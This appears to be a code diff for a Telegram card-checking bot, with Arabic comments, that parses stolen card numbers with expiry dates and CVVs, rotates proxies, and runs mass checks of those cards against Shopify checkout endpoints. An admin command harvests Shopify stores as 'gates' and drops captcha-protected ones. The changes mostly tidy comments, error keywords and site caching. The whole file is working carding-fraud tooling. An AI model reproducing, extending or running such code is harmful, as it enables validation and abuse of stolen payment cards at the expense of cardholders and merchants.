@@ -376,7 +376,6 @@ def extract_cc(text):
         for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{2})(\d{3,4})', text): cards.append(f"{c}|{m}|20{y}|{cv}")
     return list(dict.fromkeys(cards))
 
-# [إصلاح حرج وبدون أخطاء]: تنظيف دالة معالجة صيغ البروكسي كلياً من أي حروف شاذة
 def parse_proxy_format(proxy):
     proxy = proxy.strip()
     if not proxy: return None
@@ -416,7 +415,6 @@ async def get_shopify_sites():
     
     return _CACHED_SHOPIFY_SITES
 
-# تصفية شاملة ودقيقة لأكواد الخطأ المزخرفة والعادية لمنع التداخل مع Approved
 def is_dead_site_error(err):
     if not err: return True
     e = str(err).lower()
@@ -424,8 +422,8 @@ def is_dead_site_error(err):
         'step 0', 'step 0 failed', 'step 1', 'step 1 failed', 'missing stable', 'missing stablei',
         'max ret', 'cloudflare', 'timed out', 'bad gateway', 'service unavailable', 
         'gateway timeout', 'site dead', 'session_error', 'max retries', 'max retries exceeded',
-        '504', '502', '503', '429', '𝟒𝟐𝟗', 'tunnel', 'connection close', 'format error',
-        'cart failed', '422', '𝟒𝟐𝟐', 'payment token', 'unable to get payment token', 'rate limit'
+        '504', '502', '503', '429', 'tunnel', 'connection close', 'format error',
+        'cart failed', '422', 'payment token', 'unable to get payment token', 'rate limit'
     ]
     return any(k in e for k in bad_keywords)
 
@@ -593,7 +591,7 @@ async def check_shopify_api(api_url, card, site, proxy, session):
             
             rl = rm.lower()
             
-            if any(k in rl for k in ['empty submit', 'buyer_identity', 'presentment', 'payment_flexibility', 'flexibility', 'payment token', 'unable to get payment token', 'cart failed', '422', '𝟒做编制', '𝟒 souvenirs', '𝟒𝟐𝟐', 'status: 429', '429', '𝟒𝟐𝟗', 'rate limit', 'too many requests']):
+            if any(k in rl for k in ['empty submit', 'buyer_identity', 'presentment', 'payment_flexibility', 'flexibility', 'payment token', 'unable to get payment token', 'cart failed', '422', 'status: 429', '429', 'rate limit', 'too many requests']):
                 return {'status': 'Site Error', 'message': rm, 'card': card, 'gateway': gt, 'price': pr, 'retry': True}
             
             if is_dead_site_error(rm) or any(k in rl for k in ['proxy', 'timeout', 'error', 'session', 'bad gateway', 'max ret', 'step 0', 'missing', 'tunnel', 'cloudflare']):
@@ -631,7 +629,7 @@ async def remove_proxy_by_url(uid, proxy_url):
 async def check_card_with_retry(card, sites, proxies, session, gateway_name, uid, max_retries=3):
     lr = None
     for attempt in range(max_retries):
-        p_dict = None  # حماية أولية لمنع أخطاء UnboundLocalError الموقفة لخيوط الفحص
+        p_dict = None  
         if not proxies: 
             p = None
         else:
@@ -658,7 +656,7 @@ async def check_card_with_retry(card, sites, proxies, session, gateway_name, uid
                 lr = r
                 continue
 
-            if status == 'Rate Limit' or any(k in msg for k in ['429', '𝟒𝟐𝟗', '504', '405', 'gateway']):
+            if status == 'Rate Limit' or any(k in msg for k in ['429', '504', '405', 'gateway']):
                 await asyncio.sleep(random.uniform(1.0, 1.8))
                 lr = r
                 continue
@@ -830,7 +828,6 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
             except Exception: pass
         await styled_reply(update, f"<b>{CE_SMILE} {sf('Your message has been delivered to the Owner.')}</b>", use_gif=True)
 
-    # [إصلاح هندسي شامل وعادل لأمر إضافة البروكسي لإضافة المجموعة كاملة دون قص]
     elif cmd == "addpxy":
         if not await force_join_check(update, context): return
         lines = []
@@ -868,7 +865,7 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
             px = parse_proxy_format(l_clean)
             if px and px['proxy_url'] not in existing_urls:
                 parsed.append(px)
-                existing_urls.add(px['proxy_url']) # المزامنة الداخلية
+                existing_urls.add(px['proxy_url'])
                 if len(parsed) >= slots_left:
                     break
                     
@@ -1073,7 +1070,7 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
         try: await styled_send(context.bot, tu, f"<b>{CE_BOOM} {sf('System Alert')}</b>\n\n╰ {sf('Your VIP access has been revoked by the administrator.')}", use_gif=True)
         except Exception: pass
 
-    # أمر الآدمن المحدث كلياً للاعتماد الفوري على الخطة المحلية البديلة وحذف غير الشغال نهائياً من الذاكرة والملف
+    # أمر فحص البوابات المضاد للأعطال والذي يعتمد على السحب المحلي التلقائي إذا فشل الرابط
     elif cmd == "checkgates":
         if uid not in ADMIN_ID:
             await styled_reply(update, f"<b>{CE_CLOWN} {sf('Access Denied')}</b>\n\n╰ {sf('This command is restricted to administrators only.')}", use_gif=True)
@@ -1081,6 +1078,9 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
             
         tm = await styled_reply(update, f"<b>{CE_GEAR} {sf('Processing and extracting gates...')}</b>", use_gif=True)
         try:
+            global _CACHED_SHOPIFY_SITES
+            _CACHED_SHOPIFY_SITES.clear()
+            
             raw_sites = []
             if update.message.reply_to_message and update.message.reply_to_message.document:
                 f = await context.bot.get_file(update.message.reply_to_message.document.file_id)
@@ -1091,14 +1091,13 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 if os.path.exists(fp): os.remove(fp)
                 raw_sites = list(set([re.sub(r'^https?://', '', l.strip()).rstrip('/') for l in content.split('\n') if l.strip()]))
             else:
-                # آلية الفشل الآمن: محاولة جلب جيت هاب وإذا فشل يتم القراءة من الملف المحلي sites.txt مباشرة دون توقف
                 try:
                     async with aiohttp.ClientSession() as s:
-                        async with s.get(GITHUB_SITES_URL, headers={"User-Agent": "Mozilla/5.0"}, timeout=8) as r:
+                        async with s.get(GITHUB_SITES_URL, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}, timeout=15) as r:
                             if r.status == 200:
                                 content = await r.text()
                                 raw_sites = list(set([re.sub(r'^https?://', '', l.strip()).rstrip('/') for l in content.split('\n') if l.strip()]))
-                            else: raise Exception()
+                            else: raise Exception("Failed status")
                 except Exception:
                     if os.path.exists('sites.txt'):
                         async with aiofiles.open('sites.txt', 'r', encoding='utf-8') as f:
@@ -1133,7 +1132,6 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 target_url = f"https://{site_url}/cart.json"
                 try:
                     async with session.get(target_url, proxy=p_url, timeout=6, ssl=False) as resp:
-                        # استبعاد فوري لأي موقع تالف أو محمي بكابتشا لثبات واستقرار الفحص
                         if resp.status in [403, 429, 430, 502, 503, 504]:
                             captcha_count += 1
                             return
@@ -1149,11 +1147,9 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 tasks = [_validate_gate(site, test_session) for site in raw_sites]
                 await asyncio.gather(*tasks)
             
-            # الحذف النهائي الفعلي والكتابة النظيفة على ملف sites.txt
             async with aiofiles.open('sites.txt', 'w', encoding='utf-8') as f:
                 await f.write('\n'.join(working_sites))
             
-            global _CACHED_SHOPIFY_SITES
             _CACHED_SHOPIFY_SITES = working_sites
             
             res_msg = f"""<b>{CE_CROWN} {sf('Purge & Clean Completed')} {CE_PARTY}</b>
@@ -1295,7 +1291,7 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
             cpm = int((chk / elapsed_now) * 60) if elapsed_now > 0 else 0
             h_now, m_now, s_now = elapsed_now // 3600, (elapsed_now % 3600) // 60, elapsed_now % 60
             
-            dt = f"<b>━━━ {CE_GEAR} {sf('CHECKING IN PROGRESS')} {CE_GEAR} ━━━</b>\n\n├ <b>{CE_TOP} {sf('Gateway')}:</b> <code>{sf(gate_name)}</code>\n├ <b>{CE_GEAR} {sf('Workers')}:</b> <code>{sf(str(WORKERS))}</code>\n├ <b>{CE_BOOM} {sf('Response')}:</b> <code>{sf(last_resp)}</code>\n╰ <b>{CE_CHART} {sf('Time')}:</b> <code>{sf(f'{h_now}h {m_now}s {s_now}s')}</code>"
+            dt = f"<b>━━━ {CE_GEAR} {sf('CHECKING IN PROGRESS')} {CE_GEAR} ━━━</b>\n\n├ <b>{CE_TOP} {sf('Gateway')}:</b> <code>{sf(gate_name)}</code>\n├ <b>{CE_GEAR} {sf('Workers')}:</b> <code>{sf(str(WORKERS))}</code>\n├ <b>{CE_BOOM} {sf('Response')}:</b> <code>{sf(last_resp)}</code>\n╰ <b>{CE_CHART} {sf('Time')}:</b> <code>{sf(f'{h_now}h {m_now}m {s_now}s')}</code>"
             percent = int((chk / tot) * 100) if tot > 0 else 0
             
             kb = [
